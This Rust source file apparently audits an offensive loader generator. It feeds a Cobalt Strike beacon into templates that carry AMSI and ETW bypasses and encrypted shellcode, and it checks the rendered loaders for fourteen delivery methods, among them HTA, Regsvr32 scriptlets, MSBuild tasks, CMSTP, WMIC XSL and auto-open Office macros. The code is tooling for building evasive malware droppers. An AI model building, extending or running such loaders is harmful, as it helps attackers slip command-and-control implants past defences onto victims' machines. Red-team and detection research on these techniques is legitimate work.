// Audit every loader template: render against real CS beacon, validate
// structure for the target Windows runtime, report issues.

use std::fs;
use std::path::PathBuf;
use template_engine::*;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let beacon = fs::read("/Users/salma/Documents/Research/DefCrow/beacon_x64.bin")?;
    let sc_hex: String = beacon.iter().map(|b| format!("{:02x}", b)).collect();
    println!("Beacon: {} bytes ({} hex chars)\n", beacon.len(), sc_hex.len());

    let out = PathBuf::from("/tmp/audit");
    fs::create_dir_all(&out)?;

    let make_cfg = |lt: LoaderType| LoaderConfig {
        loader_type: lt,
        features: vec![Feature::AmsiHwbp, Feature::EtwHwbp, Feature::SleepEncrypt],
        encryption: Encryption::Aes256,
        shellcode_hex: sc_hex.clone(),
        key_hex: "ab".repeat(32),
        iv_hex: "cd".repeat(16),
        pe_config: None,
        appdomain_config: if lt == LoaderType::AppDomain {
            Some(AppDomainConfig {
                clr_version: "v4.0.30319".into(),
                net_version: "4.0".into(),
                assembly_name: "TestLoader".into(),
                type_name: "EvilType".into(),
                namespace: "EvilNs".into(),
                host_binary: "MSBuild.exe".into(),
            })
        } else { None },
        wsf_stub_config: if matches!(lt, LoaderType::Wsf | LoaderType::Hta | LoaderType::Regsvr32Sct | LoaderType::WmicXsl) {
            Some(WsfStubConfig { namespace: "Stub".into(), type_name: "Loader".into() })
        } else { None },
        dotnet_stub_hex: Some("4d5a90000300000004000000ffff0000".repeat(20)),
        staged: None,
    };

    let loaders = vec![
        ("Binary",      LoaderType::Binary,      "rust",   "exe",    "rust"),
        ("Dll",         LoaderType::Dll,         "rust",   "dll",    "rust"),
        ("Rundll32",    LoaderType::Rundll32,    "rust",   "dll",    "rust"),
        ("Injector",    LoaderType::Injector,    "rust",   "exe",    "rust"),
        ("AppDomain",   LoaderType::AppDomain,   "csharp", "cs",     "csharp"),
        ("InstallUtil", LoaderType::InstallUtil, "csharp", "cs",     "csharp"),
        ("Wsf",         LoaderType::Wsf,         "script", "wsf",    "wsh"),
        ("Hta",         LoaderType::Hta,         "script", "hta",    "wsh"),
        ("Regsvr32Sct", LoaderType::Regsvr32Sct, "script", "sct",    "wsh"),
        ("MsBuild",     LoaderType::MsBuild,     "script", "csproj", "msbuild"),
        ("Cmstp",       LoaderType::Cmstp,       "script", "inf",    "inf"),
        ("WmicXsl",     LoaderType::WmicXsl,     "script", "xsl",    "wsh"),
        ("DocxMacro",   LoaderType::DocxMacro,   "vba",    "bas",    "vba"),
        ("XlsxMacro",   LoaderType::XlsxMacro,   "vba",    "bas",    "vba"),
    ];

    let mut issues: Vec<(String, String)> = Vec::new();

    println!("{:<14} {:<10} {:<10} {:<25} {}", "Loader", "Size", "ASCII?", "Structure", "Runtime");
    println!("{}", "─".repeat(80));

    for (name, lt, gen, ext, runtime) in &loaders {
        let cfg = make_cfg(*lt);
        let src = match *gen {
            "rust"   => generate_loader_source(&cfg),
            "csharp" => generate_csharp_source(&cfg),
            "script" => generate_script_source(&cfg),
            "vba"    => generate_vba_source(&cfg),
            _ => unreachable!(),
        };

        let src = match src {
            Ok(s) => s,
            Err(e) => {
                println!("{:<14} RENDER FAIL: {}", name, e);
                issues.push((name.to_string(), format!("render failed: {}", e)));
                continue;
            }
        };

        let path = out.join(format!("{}.{}", name.to_lowercase(), ext));
        fs::write(&path, &src)?;

        let ascii_pct = if src.is_empty() { 100.0 } else {
            (src.bytes().filter(|b| *b < 128).count() as f64 / src.len() as f64) * 100.0
        };
        let nonascii = src.bytes().filter(|b| *b >= 128).count();

        // Structural validation per runtime
        let mut checks: Vec<(&str, bool)> = Vec::new();
        match *runtime {
            "rust" => {
                checks.push(("extern crate scaffold", src.contains("extern crate scaffold")));
                checks.push(("decrypt_aes256",        src.contains("decrypt_aes256")));
                if matches!(lt, LoaderType::Binary | LoaderType::Injector) {
                    checks.push(("fn main()",         src.contains("fn main()")));
                }
                if matches!(lt, LoaderType::Dll | LoaderType::Rundll32) {
                    checks.push(("DllMain",           src.contains("DllMain")));
                }
            }
            "csharp" => {
                checks.push(("class declaration",      src.contains("public class")));
                checks.push(("Marshal usage",          src.contains("Marshal.")));
                checks.push(("XOR decrypt path",       src.contains("fn_xor") || src.contains("_xor") || src.contains("byte[]")));
                if *lt == LoaderType::AppDomain {
                    checks.push(("AppDomainManager",   src.contains("AppDomainManager")));
                    checks.push(("InitializeNewDomain",src.contains("InitializeNewDomain")));
                }
                if *lt == LoaderType::InstallUtil {
                    checks.push(("System.Configuration.Install", src.contains("System.Configuration.Install")));
                    checks.push(("RunInstaller",       src.contains("RunInstaller")));
                }
            }
            "wsh" => {
                // Must be ASCII only (WSH codepage-sensitive)
                if nonascii > 0 {
                    issues.push((name.to_string(), format!("{} non-ASCII bytes — WSH will mis-parse", nonascii)));
                }
                match *lt {
                    LoaderType::Wsf => {
                        checks.push(("<package> root",    src.starts_with("<package>")));
                        checks.push(("<job id=...>",      src.contains("<job id=")));
                        checks.push(("<script JScript>",  src.contains("<script language=\"JScript\">")));
                        checks.push(("<![CDATA[",         src.contains("<![CDATA[")));
                        checks.push(("]]> close",         src.contains("]]>")));
                        checks.push(("NO <?xml decl",     !src.contains("<?xml")));
                    }
                    LoaderType::Hta => {
                        checks.push(("<html> root",       src.starts_with("<html>")));
                        checks.push(("HTA:APPLICATION",   src.contains("HTA:APPLICATION")));
                        checks.push(("<script VBScript>", src.contains("<script language=\"VBScript\">")));
                    }
                    LoaderType::Regsvr32Sct => {
                        checks.push(("<?XML decl",        src.starts_with("<?XML")));
                        checks.push(("<scriptlet>",       src.contains("<scriptlet>")));
                        checks.push(("<registration",     src.contains("<registration")));
                        checks.push(("progid=",           src.contains("progid=")));
                        checks.push(("<script",           src.contains("<script")));
                    }
                    LoaderType::WmicXsl => {
                        checks.push(("<?xml decl",        src.starts_with("<?xml")));
                        checks.push(("<stylesheet xmlns", src.contains("xmlns=\"http://www.w3.org/1999/XSL/Transform\"")));
                        checks.push(("<ms:script",        src.contains("<ms:script")));
                        checks.push(("implements-prefix", src.contains("implements-prefix")));
                    }
                    _ => {}
                }
            }
            "msbuild" => {
                checks.push(("<Project root",         src.contains("<Project ")));
                checks.push(("ToolsVersion attr",     src.contains("ToolsVersion=")));
                checks.push(("xmlns attr",            src.contains("xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"")));
                checks.push(("<UsingTask",            src.contains("<UsingTask")));
                checks.push(("CodeTaskFactory",       src.contains("CodeTaskFactory")));
                checks.push(("<![CDATA[",             src.contains("<![CDATA[")));
                checks.push(("public class",          src.contains("public class")));
            }
            "inf" => {
                checks.push(("[version] section",     src.contains("[version]") || src.contains("[Version]")));
                checks.push(("Signature=$chicago$",   src.contains("Signature=$chicago$")));
                checks.push(("[DefaultInstall_",      src.contains("[DefaultInstall_")));
                checks.push(("UnRegisterOCXs=",       src.contains("UnRegisterOCXs=")));
                checks.push(("scrobj.dll",            src.contains("scrobj.dll")));
            }
            "vba" => {
                if *lt == LoaderType::DocxMacro {
                    checks.push(("Document_Open",     src.contains("Document_Open")));
                    checks.push(("AutoOpen",          src.contains("AutoOpen")));
                }
                if *lt == LoaderType::XlsxMacro {
                    checks.push(("Workbook_Open",     src.contains("Workbook_Open") || src.contains("Auto_Open")));
                }
                checks.push(("Private Declare PtrSafe", src.contains("Private Declare PtrSafe")));
                checks.push(("LongPtr type",          src.contains("LongPtr")));
                checks.push(("CallWindowProc trick",  src.contains("CallWindowProcA") || src.contains("CallWindowProc")));
            }
            _ => {}
        }

        let all_pass = checks.iter().all(|(_, v)| *v);
        let symbol = if all_pass && nonascii == 0 { "✓" } else { "✗" };
        let ascii_label = if nonascii == 0 { "100% ASCII".to_string() } else { format!("{} non-ASCII", nonascii) };
        let chk_summary = format!("{}/{}", checks.iter().filter(|(_, v)| *v).count(), checks.len());

        println!("{:<14} {:<10} {:<10} {:<25} {} {}", name, src.len(), ascii_label, chk_summary, symbol, runtime);

        for (k, v) in &checks {
            if !v {
                issues.push((name.to_string(), format!("missing: {}", k)));
            }
        }
    }

    println!();
    if issues.is_empty() {
        println!("✓ All loaders render correctly with no structural issues");
    } else {
        println!("─── ISSUES FOUND ──");
        for (loader, issue) in &issues {
            println!("  {}: {}", loader, issue);
        }
    }

    let _ = ascii_pct_placeholder();
    Ok(())
}

fn ascii_pct_placeholder() {}
